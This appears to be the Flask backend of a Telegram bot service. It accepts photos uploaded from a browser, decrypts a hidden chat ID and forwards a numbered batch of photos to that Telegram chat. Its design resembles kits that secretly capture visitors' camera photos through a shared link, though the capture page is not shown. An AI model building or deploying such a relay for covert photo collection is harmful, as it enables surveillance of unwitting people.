from flask import Flask, request, jsonify
import os
import requests
from encryption import decrypt_id
import logging

app = Flask(__name__)

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# قراءة التوكن من المتغيرات البيئية
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN not set")

@app.route('/api/send-photo', methods=['POST'])
def send_photo():
    """استقبال الصور من المتصفح وإرسالها إلى تيليجرام"""
    try:
        # استقبال البيانات
        encrypted_id = request.form.get('chat_id')
        photo = request.files.get('photo')
        caption = request.form.get('caption', '📸 صورة جديدة')
        photo_count = request.form.get('photo_count', '0')
        total_photos = request.form.get('total_photos', '10')
        
        if not encrypted_id or not photo:
            return jsonify({"success": False, "error": "Missing data"}), 400
        
        # فك تشفير المعرف
        try:
            chat_id = decrypt_id(encrypted_id)
            logger.info(f"Decrypted ID: {chat_id}")
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return jsonify({"success": False, "error": "Invalid encryption"}), 400
        
        # إرسال الصورة إلى تيليجرام
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        
        # تحضير الملف
        files = {'photo': (photo.filename, photo.read(), photo.content_type)}
        data = {
            'chat_id': chat_id,
            'caption': f"{caption}\n\n🆔 ID: {encrypted_id}\n📸 {photo_count}/{total_photos}"
        }
        
        # إرسال الطلب
        response = requests.post(url, files=files, data=data, timeout=30)
        result = response.json()
        
        if result.get('ok'):
            logger.info(f"✅ Photo sent to {chat_id} ({photo_count}/{total_photos})")
            return jsonify({"success": True, "response": result})
        else:
            logger.error(f"Telegram API error: {result}")
            return jsonify({"success": False, "error": result.get('description', 'Unknown error')}), 500
            
    except Exception as e:
        logger.error(f"Error in send_photo: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/get-user', methods=['GET'])
def get_user():
    """الحصول على معلومات المستخدم"""
    try:
        encrypted_id = request.args.get('q')
        if not encrypted_id:
            return jsonify({"success": False, "error": "Missing ID"}), 400
        
        # فك تشفير المعرف
        chat_id = decrypt_id(encrypted_id)
        
        # استدعاء API تيليجرام للحصول على معلومات المستخدم
        url = f"https://api.telegram.org/bot{TOKEN}/getChat"
        response = requests.get(url, params={'chat_id': chat_id}, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            name = result['result'].get('first_name', 'مستخدم')
            return jsonify({"success": True, "name": name})
        else:
            return jsonify({"success": False, "error": result.get('description', 'User not found')})
            
    except Exception as e:
        logger.error(f"Error in get_user: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """فحص صحة الخادم"""
    return jsonify({
        "status": "healthy",
        "token_configured": bool(TOKEN),
        "timestamp": __import__('datetime').datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
